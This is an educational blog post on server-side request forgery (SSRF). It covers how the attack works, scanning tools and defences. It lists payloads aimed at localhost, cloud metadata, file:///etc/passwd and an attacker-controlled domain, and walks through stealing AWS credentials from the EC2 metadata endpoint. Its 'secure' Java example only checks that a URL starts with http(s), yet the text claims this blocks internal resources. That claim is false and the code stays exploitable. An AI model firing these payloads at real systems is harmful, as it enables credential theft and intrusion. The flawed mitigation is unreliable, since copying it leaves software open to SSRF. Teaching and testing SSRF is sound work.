# Server-Side Request Forgery (SSRF)

- **Source URL:** https://securitycipher.com/docs/server-side-request-forgery
- **Fetched from:** https://securitycipher.com/docs/security/vulnerability-explain/server-side-request-forgery/
- **Fetched:** 2026-11-14
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4436 (id 4436)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Welcome to a journey through the world of cybersecurity! In this blog post, we're breaking down Server-Side Request Forgery (SSRF) in simple terms. Whether you're new to cybersecurity or a seasoned developer, we've got you covered. Learn what SSRF is, how it works, and why it matters. We'll explore easy-to-use tools, best practices for protection, and even share some real-world examples. By the end, you'll be equipped with practical insights to enhance your cybersecurity know-how and keep your digital space secure. Let's dive in!

## What is SSRF?

SSRF, at its core, is an exploit that enables attackers to force a server into making requests on their behalf. Unlike other vulnerabilities that target client-side elements, SSRF operates on the server side, leveraging the trust placed in the server to perform unauthorized actions.

*Let's say you have a website where you can view messages by entering a URL. The website fetches and shows you the content from that URL. Now, if the website doesn't check properly, an attacker could enter the URL of a private server meant only for the website itself. The attacker tricks the website into showing them sensitive information, like private messages or secret data, even though they shouldn't have access to it.*

So, SSRF is like asking a website to show you something it shouldn't, just by cleverly manipulating the requests it makes to other servers. It's important for websites to be careful and check who's making the requests to keep their information safe!

## How SSRF work?

Server-Side Request Forgery (SSRF) is a potent vulnerability that exploits a web application's ability to make HTTP requests to other servers. In simple terms, SSRF (Server-Side Request Forgery) works like a puppeteer controlling strings behind the scenes. Here's a basic breakdown:

- **User Input and URL Parsing:**
  - The web application takes user input, typically in the form of a URL, as part of its functionality. This input is often used to fetch data from external sources.
- **User-Supplied URL:**
  - The user supplies a URL as input, intending for the application to fetch data from that location. This URL can be part of an API call, an image request, or any other feature that involves making HTTP requests.
- **Request Processing:**
  - The server processes the user-supplied URL, parsing it to understand where to make the requested HTTP connection. This often involves resolving the hostname and determining the protocol (HTTP or HTTPS).
- **Making the Request:**
  - The application constructs an HTTP request based on the parsed user input and sends it to the specified URL. This is typically done using libraries or functions provided by the programming language or framework.
- **Exploiting SSRF:**
  - An attacker, recognizing the presence of SSRF vulnerability, manipulates the user-supplied URL to make requests to unintended destinations. Instead of a legitimate external resource, the attacker may use techniques to point the request to internal services, sensitive files, or third-party services.
- **Accessing Internal Resources:**
  - If successful, the attacker can access internal resources that are not meant to be exposed to the public. This may include databases, internal APIs, configuration files, or even services within the same network.
- **Potential Impacts:**
  - Depending on the nature of the SSRF vulnerability and the attacker's intent, the impacts can range from unauthorized data access to more severe consequences like remote code execution, denial of service, or exploiting trust relationships between services.

In essence, SSRF is like convincing a website to fetch information it shouldn't, by making it send secret requests on behalf of the attacker. It's a sneaky way of pulling strings to access data that's meant to be kept private.

## [Tools](https://securitycipher.com/security-tools/) and Techniques for SSRF Vulnerability Testing

In the realm of penetration testing, thoroughly examining and fortifying systems against vulnerabilities is paramount. Server-side request Forgery (SSRF) stands out as a potent threat, making it essential to employ robust tools and methodologies for comprehensive testing.

### Manual SSRF Testing Methodologies

- **Protocol Manipulation Exploration** - Probing SSRF by manipulating protocols (HTTP, FTP, etc.) to trick the server. - Exploring the intricacies of URL encoding and decoding for protocol manipulation.
- **Parameter Tampering** - Systematically testing parameters within URLs to discover SSRF vulnerabilities. - Dynamically altering parameters to assess the server's response and behavior.
- **Error-Based SSRF Detection** - Leveraging error messages to pinpoint SSRF-prone areas. - Analyzing server responses for clues, including stack traces and error codes.
- **DNS Rebinding Techniques** - Employing DNS rebinding to deceive the target server and establish unauthorized communication. - Understanding the nuances of DNS caching and resolution in SSRF scenarios.

### Automated SSRF Scanning [Tools](https://securitycipher.com/security-tools/)

- [**Nuclei**](https://github.com/projectdiscovery/nuclei) - Introduction to Nuclei as a versatile and extensible open-source tool for identifying SSRF vulnerabilities. - Customizing templates to perform SSRF-specific scans on various targets.
- [**SSRFmap**](https://github.com/swisskyrepo/SSRFmap) - Unveiling the capabilities of SSRFmap for automated detection and exploitation. - Integrating SSRFmap into penetration testing workflows for efficiency.
- [**Burp Suite SSRF Scanner**](https://portswigger.net/burp/documentation/desktop/automated-scanning) - Harnessing the power of Burp Suite for SSRF vulnerability scanning. - Configuring and optimizing Burp Suite's SSRF Scanner for precise results.
- [**SSRFPwned**](https://github.com/blackhatethicalhacking/SSRFPwned) - Checks for SSRF using built-in custom Payloads after fetching URLs from Multiple Passive Sources & applying complex patterns aimed at SSRF
- [**SSRFire**](https://github.com/ksharinarayanan/SSRFire) - An automated SSRF finder. Just give the domain name and your server and chill! 😉 Also has options to find XSS and open redirects

## SSRF Protection Mechanisms

Server-side request Forgery (SSRF) vulnerabilities can pose serious threats to web applications and backend systems. To safeguard against potential exploits, adopting robust protection mechanisms is imperative. I

### Best Practices for Secure Coding

- **Input Validation and Whitelisting**
  - **Description**: Always validate and sanitize user inputs rigorously.
  - **Benefits**: Mitigates the risk of attackers manipulating input to trigger SSRF.
  - **Implementation Tip**: Employ whitelisting of allowed URLs or IP ranges to restrict input to legitimate sources.
- **URL Parsing and Validation Libraries**
  - **Description**: Utilize established URL parsing libraries in your programming language.
  - **Benefits**: Helps in proper validation of URLs, reducing the likelihood of SSRF exploits.
  - **Implementation Tip**: Regularly update and patch the parsing libraries to address potential vulnerabilities.
- **Use of Relative URLs**
  - **Description**: Prefer relative URLs over absolute ones in internal requests.
  - **Benefits**: Restricts the impact of SSRF by limiting requests to the application's own domain.
  - **Implementation Tip**: Ensure that internal processes do not blindly interpret user-provided URLs without validation.
- **Network Segmentation**
  - **Description**: Segment your network to limit the exposure of internal services.
  - **Benefits**: Reduces the attack surface for potential SSRF exploits.
  - **Implementation Tip**: Employ firewalls and access controls to restrict communication between different network segments.
- **HTTP Redirect Controls**
  - **Description**: Implement controls on HTTP redirects to prevent attackers from manipulating redirection flows.
  - **Benefits**: Adds an additional layer of defense against SSRF attacks.
  - **Implementation Tip**: Validate and sanitize user-inputs before utilizing them in HTTP redirects.
- **Logging and Monitoring**
  - **Description**: Implement comprehensive logging for all incoming requests.
  - **Benefits**: Facilitates early detection of SSRF attempts, enabling rapid response.
  - **Implementation Tip**: Regularly review logs for anomalous behavior and unexpected request patterns.
- **SSRF Signatures and Rules**
  - **Description**: Configure WAF rules specifically designed to detect and block SSRF attempts.
  - **Benefits**: Provides an additional layer of defense by actively monitoring and blocking malicious SSRF requests.
  - **Implementation Tip**: Regularly update WAF signatures to stay ahead of emerging SSRF attack vectors.
- **Protocol Whitelisting**
  - **Description:** Restrict the allowed protocols in user-generated URLs.
  - **Benefits**: Prevents the use of potentially dangerous protocols in SSRF attempts.
  - **Implementation Tip**: Only allow essential protocols (e.g., HTTP, HTTPS) and disallow less common or risky ones.
- **Rate Limiting for Outbound Requests**
  - **Description**: Set up rate limits for outgoing requests from your application.
  - **Benefits**: Mitigates the impact of SSRF by limiting the frequency of malicious requests.
  - **Implementation Tip**: Adjust rate limits based on expected application behavior and monitor for sudden spikes.

By incorporating these best practices for secure coding and WAF considerations, organizations can significantly bolster their defenses against SSRF vulnerabilities. Regularly updating and refining these measures is crucial in the ever-evolving landscape of web application security.

### Best Practices for Organizations

- **Web Application Firewall (WAF)**
  - Deploy a robust WAF to filter and block malicious requests, including those attempting SSRF attacks.
  - Regularly update WAF rules to adapt to emerging threats and attack vectors.
- **Network Segmentation**
  - Employ network segmentation to isolate critical internal services from external access points.
  - Minimize the attack surface by only exposing necessary services to the internet.
- **Logging and Monitoring**
  - Implement comprehensive logging for both incoming and outgoing requests at the application level.
  - Establish monitoring systems to detect and alert on unusual patterns indicative of SSRF activity.
- **Penetration Testing and Code Reviews**
  - Conduct regular penetration tests to identify and remediate SSRF vulnerabilities.
  - Integrate SSRF-specific checks into code review processes to catch potential issues before deployment.
- **Regular Updates and Patching**
  - Keep software, libraries, and frameworks up-to-date to patch known SSRF-related vulnerabilities.
  - Monitor security advisories and promptly apply patches to mitigate emerging threats.
- **Incident Response Plan**
  - Develop and regularly update an incident response plan specific to SSRF incidents.
  - Define clear procedures for identifying, containing, and mitigating SSRF attacks promptly.
- **Bug Bounty Programs**
  - Encourage responsible disclosure by establishing bug bounty programs.
  - Reward security researchers for responsibly reporting SSRF vulnerabilities, fostering a collaborative security community.

By integrating these recommendations into the development lifecycle and organizational security practices, developers and organizations can significantly reduce the risk of SSRF vulnerabilities and fortify their web applications against potential exploits.

## Top SSRF payloads used by Security Researchers

As a security researcher, it is important to be familiar with the most commonly used SSRF payloads in order to effectively detect and prevent such attacks. However, it is illegal and unethical to use these payloads for malicious purposes. Instead, this knowledge should be used to improve security for both yourself and others. For a more extensive list of SSRF payloads, you can refer to the following resource:

```
// Basic SSRF Payloads:
Use these payloads to initiate basic SSRF testing by attempting to fetch internal resources.
http://localhost
http://127.0.0.1
http://internal-server
http://metadata.google.internal/computeMetadata/v1/
```
```
// File Retrieval Payloads:
Test SSRF by attempting to read files from the server.
file:///etc/passwd
file:///etc/hostname
file:///etc/hosts
```
```
// DNS Interaction Payloads:
Utilize payloads to interact with DNS services and gather information.
http://attacker-controlled-domain.com
http://attacker-controlled-domain.com:80
http://attacker-controlled-domain.com:443
```
```
// HTTP Protocol Abuse:
Test SSRF by manipulating the protocol and attempting to access internal services.
ftp://attacker-controlled-domain.com:21/
```
```
// IPv6 Based Payloads:
Test SSRF vulnerabilities with IPv6 addresses.
http://[::]:80
http://[::1]:80
http://0:0:0:0:0:ffff:7f00:1
```
```
// SSRF via Parameter Manipulation:
Manipulate parameters to test SSRF in URL parsing.
http://target.com/?url=http://attacker-controlled-domain.com
http://target.com/?path=http://attacker-controlled-domain.com
```
```
// SSRF via Request Smuggling:
Explore SSRF vulnerabilities through HTTP request smuggling.
POST /path HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
0
GET / HTTP/1.1
Host: attacker-controlled-domain.com
```
```
//Testing Local Services:
Test SSRF by targeting common internal services.
http://127.0.0.1:22
http://localhost:3306
http://internal-service.local:8080
```
## Exploiting SSRF in Amazon EC2: A Cloud Web App Vulnerability

**Vulnerable Web Application:**

- The web application is a cloud-based service hosted on an Amazon EC2 instance.
- It provides a feature allowing users to input a URL to fetch and display the content on a webpage.
- Unfortunately, the application lacks proper validation and sanitization of user-provided URLs, making it susceptible to SSRF.
- The web application is deployed on an Amazon EC2 instance, a popular choice for hosting scalable web applications in the cloud.

To exploit , The attacker interacts with the web application by submitting a form containing the malicious URL.

```
POST /fetch HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
The vulnerable server on the EC2 instance receives the HTTP request and extracts the user-provided URL without proper validation.

`user_url = request.getParameter("url");` The server, unaware of the malicious intent, makes an HTTP request to the user-provided URL.

```
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
```
The AWS metadata server responds with sensitive information, such as temporary security credentials.

```
HTTP/1.1 200 OK
Content-Type: application/json
{
"AccessKeyId": "AKIAYWIE3ZOVNOPQ",
"SecretAccessKey": "8f+9pH1y9yzvCFk2uR90ty1EXAMPLEKEY",
"Token": "FwoGZXIvYXdzECoaDJjLGA4dfa0b8aUq7iKZAfdy30xhXPCb9/bMOc3f2b4OvWY6JRKvq7Y3rfzR2bbzxlLZSny/nDgHh5frZCpURio1cw3HvL0Op4bUq8a1FkVpXv/i0JAREXAMPLEDMQGAUtnOq7+RyJ6ev4vY9dgHv2jLJJOXTaLsQJb8vH1BdNzHu9ic0tEEXAMPLEReXAMPLE+M+hTtFfEMAR4aDOMvi8+dozqWVMKPj4NQIiANzrUjrC2cf0Tg1lTplfE9EXAMPLE9vRCeKiL+g/7m5CW+FFyXaB0tr92N9QixTs2tU2yG9qOGuBr5kvruFNXEXAMPLE==",
"Expiration": "2023-12-01T23:59:59Z"
}
```
The web application, unaware of the SSRF attack, displays the sensitive AWS security credentials on the webpage.

```
<html>
<body>
<h1>Result</h1>
<pre>
AccessKeyId: AKIAYWIE3ZOVNOPQ
SecretAccessKey: 8f+9pH1y9yzvCFk2uR90ty1EXAMPLEKEY
Token: FwoGZXIvYXdzECoaDJjLGA4dfa0b8aUq7iKZAfdy30xhXPCb9/bMOc3f2b4OvWY6JRKvq7Y3rfzR2bbzxlLZSny/nDgHh5frZCpURio1cw3HvL0Op4bUq8a1FkVpXv/i0JAREXAMPLEDMQGAUtnOq7+RyJ6ev4vY9dgHv2jLJJOXTaLsQJb8vH1BdNzHu9ic0tEEXAMPLEReXAMPLE+M+hTtFfEMAR4aDOMvi8+dozqWVMKPj4NQIiANzrUjrC2cf0Tg1lTplfE9EXAMPLE9vRCeKiL+g/7m5CW+FFyXaB0tr92N9QixTs2tU2yG9qOGuBr5kvruFNXEXAMPLE==
Expiration: 2023-12-01T23:59:59Z
</pre>
</body>
</html>
```
The web application is hosted on an Amazon EC2 instance, showcasing a common deployment scenario in the cloud. The attacker leverages the EC2 instance's trust in user-provided URLs to exploit the SSRF vulnerability and gain access to sensitive AWS security credentials. This highlights the critical importance of securing applications against SSRF by implementing robust input validation and access controls, especially in cloud-based environments.

## [Vulnerable and secure code](https://securitycipher.com/docs-category/secure-code/) of SSRF

The following example illustrates the contrast between a vulnerable and a secure code for SSRF. Through this demonstration, one can gain a deeper understanding of how SSRF vulnerabilities can occur within a code and the measures that can be taken to mitigate such risks and ensure the code's security.

### 🥺Vulnerable Code:

```
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
public class VulnerableSSRF {
public static void main(String[] args) {
try {
// Get user-input URL
System.out.print("Enter URL: ");
BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
String inputURL = reader.readLine();
// Fetch and display content from the provided URL
URL url = new URL(inputURL);
BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
String inputLine;
while ((inputLine = in.readLine()) != null) {
System.out.println(inputLine);
}
in.close();
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
- This code directly takes user input (`inputURL`) without proper validation.
- An attacker can manipulate the input to point to internal resources, potentially leading to SSRF.

### 😎 Secure Code:

```
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.regex.Pattern;
public class SecureSSRF {
public static void main(String[] args) {
try {
// Get user-input URL
System.out.print("Enter URL: ");
BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
String inputURL = reader.readLine();
// Validate URL format to prevent SSRF
if (isValidURL(inputURL)) {
// Fetch and display content from the provided URL
URL url = new URL(inputURL);
BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
String inputLine;
while ((inputLine = in.readLine()) != null) {
System.out.println(inputLine);
}
in.close();
} else {
System.out.println("Invalid URL format.");
}
} catch (Exception e) {
e.printStackTrace();
}
}
// Function to validate URL format
private static boolean isValidURL(String url) {
String regex = "^https?://.*$";
return Pattern.matches(regex, url);
}
}
```
- Added a `isValidURL` function to check whether the provided URL follows the expected format (in this case, it should start with "http://" or "https://").
- This validation helps prevent attackers from supplying URLs that point to internal or malicious resources.

## Conclusion

In conclusion, understanding and addressing Server-Side Request Forgery (SSRF) is paramount in the ever-evolving landscape of cybersecurity. This article has provided a comprehensive overview of SSRF, from its fundamental workings and exploitation techniques to best practices for testing, protection mechanisms, and secure coding recommendations. By delving into the methodologies employed by attackers, exploring tools for vulnerability testing, and outlining protective measures, organizations and developers can fortify their web applications against potential exploits. The inclusion of top SSRF payloads serves as a valuable resource for security researchers, emphasizing the ethical use of knowledge to enhance security rather than compromise it. Additionally, the demonstration of both vulnerable and secure code illustrates the critical role of secure coding practices in mitigating SSRF risks. Ultimately, by embracing a proactive approach through thorough testing, continuous improvement of security measures, and responsible information sharing, the cybersecurity community can collectively reduce the impact of SSRF vulnerabilities and enhance the overall resilience of web applications.
